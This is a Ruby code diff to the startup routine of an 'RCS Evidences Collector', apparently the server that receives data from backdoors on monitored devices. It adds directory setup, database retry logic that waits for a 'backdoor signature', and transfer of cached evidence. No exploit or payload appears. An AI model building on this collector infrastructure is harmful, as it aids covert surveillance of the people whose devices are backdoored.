@@ -6,15 +6,19 @@
 require_relative 'events.rb'
 require_relative 'config.rb'
 require_relative 'db.rb'
+require_relative 'evidence_transfer.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/evidence_manager'
 
 # from System
 require 'yaml'
 
 module RCS
 module Collector
+
+PUBLIC_DIR = '/public'
 
 class Application
   include RCS::Tracer
@@ -27,10 +31,14 @@ class Application
       typ = Dir.pwd
       ty = 'trace.yaml'
     else
-      typ = File.dirname(File.dirname(File.dirname(__FILE__))) + "/config"
-      ty = typ + "/trace.yaml"
-      puts "Cannot find 'trace.yaml' using the default one (#{ty})"
+      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
+      ty = typ + "/config/trace.yaml"
+      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
     end
+
+    # ensure the public and log directory are present
+    Dir::mkdir(Dir.pwd + PUBLIC_DIR) if not File.directory?(Dir.pwd + PUBLIC_DIR)
+    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
 
     # initialize the tracing facility
     begin
@@ -42,23 +50,48 @@ class Application
 
     begin
 
-      trace :info, "Starting the RCS Evidences Collector..."
+      version = File.read(Dir.pwd + '/config/version.txt')
+      trace :info, "Starting the RCS Evidences Collector #{version}..."
       
       # config file parsing
-      Config.instance.load_from_file
+      return 1 unless Config.load_from_file
 
-      # test the connection to the database
-      DB.instance.check_conn
+      begin
+        # test the connection to the database
+        if DB.connect! then
+          trace :info, "Database connection succeeded"
+        else
+          trace :warn, "Database connection failed, using local cache..."
+        end
 
-      # cache cleanup
-      DB.instance.cache_init if DB.instance.connected?
+        # cache initialization
+        DB.cache_init
+
+        # wait 10 seconds and retry the connection
+        # this case should happen only the first time we connect to the db
+        # after the first successful connection, the cache will get populated
+        # and even if the db is down we can continue
+        if DB.backdoor_signature.nil? then
+          trace :info, "Empty global signature, cannot continue. Waiting 10 seconds and retry..."
+          sleep 10
+        end
+
+      # do not continue if we don't have the global backdoor signature
+      end while DB.backdoor_signature.nil?
+
+      # if some instance are still in SYNC_IN_PROGRESS status, reset it to
+      # SYNC_TIMEOUT. we are starting now, so no valid session can exist
+      EvidenceManager.sync_timeout_all
+
+      # transfer all the previously cached evidence, if any
+      EvidenceTransfer.send_cached
 
       # enter the main loop (hopefully will never exit from it)
-      Events.new.setup Config.instance.global['LISTENING_PORT']
+      Events.new.setup Config.global['LISTENING_PORT']
 
-    rescue Exception => detail
-      trace :fatal, "FAILURE: " << detail.message
-      trace :fatal, "EXCEPTION: " << detail.backtrace.join("\n")
+    rescue Exception => e
+      trace :fatal, "FAILURE: " << e.message
+      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
       return 1
     end
 
